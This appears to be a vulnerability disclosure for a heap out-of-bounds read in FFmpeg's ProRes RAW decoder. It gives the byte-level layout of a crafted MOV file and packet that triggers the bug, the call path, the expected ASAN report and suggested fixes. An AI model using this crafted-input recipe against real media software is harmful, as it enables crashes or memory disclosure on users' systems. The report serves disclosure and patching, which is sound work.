# VULN 001 — Heap OOB Read in decode_tile() via Unchecked bytestream2_get_byteu

## Summary

| Field | Value |
|-------|-------|
| CWE | CWE-125 (Out-of-Bounds Read) |
| File | libavcodec/prores_raw.c |
| Lines | 262–263 |
| Codec | ProRes RAW (`aprh` / `aprn`) |
| Container | QuickTime MOV |

---

## PoC Approach

`vuln_001_gen.py` constructs a minimal, hand-crafted QuickTime MOV file using
only Python `struct` / `bytes` primitives.  No FFmpeg API is called; the entire
binary is built from first principles by reading the decode_frame() parsing
logic in prores_raw.c.

### MOV container layout

```
ftyp  (20 bytes)  — major brand 'qt  '
moov              — movie header + single 16×16 'aprh' video track
  mvhd
  trak
    tkhd
    mdia
      mdhd
      hdlr  (handler = 'vide')
      minf
        vmhd
        dinf / dref
        stbl
          stsd  — VisualSampleEntry with box-type 'aprh'
          stts  — 1 sample, delta 1
          stsc  — 1 chunk, 1 sample per chunk
          stsz  — sample size = 83 bytes
          stco  — chunk offset → first byte of mdat payload
mdat  (8 + 83 bytes)  — contains the crafted ProRes RAW frame
```

The codec tag `aprh` maps to `AV_CODEC_ID_PRORES_RAW` in the MOV demuxer
(`libavformat/isom_tags.c` lines 239–240), so FFmpeg automatically selects the
`prores_raw` decoder.

### Crafted ProRes RAW packet (83 bytes)

```
[0:4]   frame_size  = 83  (BE32)  — decode_frame() checks this == avpkt->size
[4:8]   'prrf'                    — ProRes RAW frame magic
[8:10]  header_len  = 72  (BE16)  — body = 70 bytes; satisfies >= 62 check
[10:80] header body (70 bytes)    — valid: version=0, vendor='peac',
                                   w=16 h=16, bayer=RGGB, flags=0
[80:82] tile size table           — 1 tile: size = 0  (BE16)
[82]    one padding byte          — total = 83, needed so offset(82) < size(83)
```

---

## Trigger Path

```
ffmpeg -i vuln_001_input.mov -f null -
  → avformat_open_input()               MOV demuxer parses container atoms
  → avcodec_send_packet()               dispatches ProRes RAW packet (83 bytes)
  → decode_frame() [prores_raw.c]
      bytestream2_get_be32() == 83      ✓ frame_size matches
      bytestream2_get_be32() == 'prrf'  ✓ magic OK
      header_len = 72 (>= 62)           ✓ header length OK
      w=16, h=16, bayer=0               ✓ valid dimensions
      flags=0  → align=0
      nb_tw=1, nb_th=1, nb_tiles=1
      offset = 80 + 1*2 = 82
      tile[0].size = 0
        → (0 >= 83)?    NO              ✓ upper-bound check passes
        → (82 >= 83)?   NO              ✓ offset check passes
        → (82 > 83-0)?  NO              ✓ combined check passes
      bytestream2_init(&tile->gb, avpkt->data+82, 0)
        buffer == buffer_end == avpkt->data+82  (ZERO bytes available)
  → decode_tiles() via avctx->execute2()
  → decode_tile() [prores_raw.c line 262]
      bytestream2_get_byteu(&tile->gb)  reads avpkt->data[82]  (valid — last byte)
                                        buffer advances to avpkt->data+83
      [line 263]
      bytestream2_get_byteu(&tile->gb)  reads avpkt->data[83]  ← HEAP OOB READ
                                        (1 byte past the 83-byte heap allocation)
```

The unchecked (`u`) variant `bytestream2_get_byteu` is defined as:

```c
static av_always_inline type bytestream2_get_byteu(GetByteContext *g) {
    return bytestream_get_byte(&g->buffer);   // no bounds check whatsoever
}
```

The checked variant (`bytestream2_get_byte`) would have returned 0 and left the
buffer pointer at `buffer_end`, but the code uses the unchecked form.

---

## Expected ASAN Output

ASAN should report a **heap-buffer-overflow** (read of size 1) on the second
`bytestream2_get_byteu` call, with a stack trace pointing to
`decode_tile` → `bytestream2_get_byteu` at prores_raw.c line 263.

```
=================================================================
==PID==ERROR: AddressSanitizer: heap-buffer-overflow on address ...
READ of size 1 at 0x... thread T...
    #0 ... bytestream2_get_byteu
    #1 ... decode_tile (prores_raw.c:263)
    #2 ... decode_tiles
    #3 ... avctx->execute2 ...
```

---

## Fix Suggestion

Add a minimum-size guard in `decode_frame()` before initialising the tile's
`GetByteContext`:

```c
if (size < 8)   // tile header requires at least 8 bytes (header_len + scale + 3×size16)
    return AVERROR_INVALIDDATA;
```

Or, replace the two `bytestream2_get_byteu` calls in `decode_tile()` with the
checked variants `bytestream2_get_byte` and propagate an error when the tile
buffer is exhausted.
